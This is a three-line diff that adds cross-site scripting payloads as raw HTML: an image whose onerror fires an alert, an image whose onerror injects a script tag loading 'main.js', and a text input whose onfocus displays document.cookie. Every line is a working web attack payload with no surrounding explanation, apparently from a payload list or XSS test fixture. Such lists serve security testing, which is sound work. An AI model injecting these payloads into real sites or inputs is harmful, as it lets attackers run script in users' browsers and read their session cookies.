@@ -1,0 +1,3 @@
+<img src="pic.gif" onerror="javascript:alert('HelloWorld');" alt="pic" />
+<img src=x onerror=document.body.appendChild(createElement('script')).src='main.js'>
+<input type="text" name="state" value="dd" onfocus="alert(document.cookie)">
